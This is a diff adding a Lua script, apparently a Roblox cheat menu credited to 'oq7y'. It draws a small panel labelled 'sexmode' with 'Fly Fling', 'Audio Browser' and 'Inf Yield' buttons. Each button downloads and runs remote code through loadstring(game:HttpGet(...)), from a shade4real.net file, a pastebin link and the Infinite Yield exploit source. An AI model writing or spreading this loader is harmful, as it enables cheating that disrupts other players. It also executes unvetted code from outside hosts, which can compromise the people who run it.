@@ -1,0 +1,123 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local credits = Instance.new("TextLabel")
+local FlyFling = Instance.new("TextButton")
+local GUI = Instance.new("TextLabel")
+local AudioBrowser = Instance.new("TextButton")
+local InfYield = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Frame.BackgroundTransparency = 0.300
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 2
+Frame.Position = UDim2.new(0.0684056059, 0, 0.681004763, 0)
+Frame.Size = UDim2.new(0, 176, 0, 172)
+
+credits.Name = "credits"
+credits.Parent = Frame
+credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+credits.BackgroundTransparency = 1.000
+credits.BorderSizePixel = 0
+credits.Position = UDim2.new(0.171652272, 0, 0.840399504, 0)
+credits.Size = UDim2.new(0, 115, 0, 27)
+credits.Font = Enum.Font.GothamBold
+credits.Text = "made by oq7y / oq#6809"
+credits.TextColor3 = Color3.fromRGB(255, 129, 25)
+credits.TextSize = 14.000
+
+FlyFling.Name = "Fly Fling"
+FlyFling.Parent = Frame
+FlyFling.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+FlyFling.BorderColor3 = Color3.fromRGB(0, 0, 0)
+FlyFling.BorderSizePixel = 2
+FlyFling.Position = UDim2.new(0.296715736, 0, 0.19848527, 0)
+FlyFling.Size = UDim2.new(0, 70, 0, 25)
+FlyFling.Font = Enum.Font.GothamBold
+FlyFling.Text = "Fly Fling"
+FlyFling.TextColor3 = Color3.fromRGB(225, 225, 225)
+FlyFling.TextSize = 12.000
+
+GUI.Name = "GUI"
+GUI.Parent = Frame
+GUI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+GUI.BackgroundTransparency = 1.000
+GUI.BorderSizePixel = 0
+GUI.Position = UDim2.new(0.226047009, 0, -0.0106929382, 0)
+GUI.Size = UDim2.new(0, 95, 0, 29)
+GUI.Text = "sexmode"
+GUI.TextColor3 = Color3.fromRGB(255, 129, 25)
+GUI.TextSize = 14.000
+
+AudioBrowser.Name = "Audio Browser"
+AudioBrowser.Parent = Frame
+AudioBrowser.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+AudioBrowser.BorderColor3 = Color3.fromRGB(0, 0, 0)
+AudioBrowser.BorderSizePixel = 2
+AudioBrowser.Position = UDim2.new(0.296715736, 0, 0.610249996, 0)
+AudioBrowser.Size = UDim2.new(0, 70, 0, 25)
+AudioBrowser.Font = Enum.Font.GothamBold
+AudioBrowser.Text = "Audio Browser"
+AudioBrowser.TextColor3 = Color3.fromRGB(225, 225, 225)
+AudioBrowser.TextSize = 9.000
+
+InfYield.Name = "Inf Yield"
+InfYield.Parent = Frame
+InfYield.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+InfYield.BorderColor3 = Color3.fromRGB(0, 0, 0)
+InfYield.BorderSizePixel = 2
+InfYield.Position = UDim2.new(0.296715736, 0, 0.404367626, 0)
+InfYield.Size = UDim2.new(0, 70, 0, 25)
+InfYield.Font = Enum.Font.GothamBold
+InfYield.Text = "Inf Yield"
+InfYield.TextColor3 = Color3.fromRGB(225, 225, 225)
+InfYield.TextSize = 12.000
+
+-- Scripts:
+
+local function QCSSTT_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	local frame = script.Parent
+	
+	if frame then
+		frame.Draggable = true
+		frame.Active = true
+		frame.Selectable = true
+	end
+end
+coroutine.wrap(QCSSTT_fake_script)()
+local function GCAK_fake_script() -- FlyFling.Script 
+	local script = Instance.new('Script', FlyFling)
+
+	script.Parent.MouseButton1Click:connect(function()
+		loadstring(game:HttpGet('https://files.shade4real.net/flinger.txt'))()
+	end)
+end
+coroutine.wrap(GCAK_fake_script)()
+local function CUQEQ_fake_script() -- AudioBrowser.Script 
+	local script = Instance.new('Script', AudioBrowser)
+
+	script.Parent.MouseButton1Click:connect(function()
+		loadstring(game:HttpGet('https://pastebin.com/raw/eBeiFgcJ'))()
+	end)
+end
+coroutine.wrap(CUQEQ_fake_script)()
+local function IMRUHJ_fake_script() -- InfYield.Script 
+	local script = Instance.new('Script', InfYield)
+
+	script.Parent.MouseButton1Click:connect(function()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+	end)
+end
+coroutine.wrap(IMRUHJ_fake_script)()
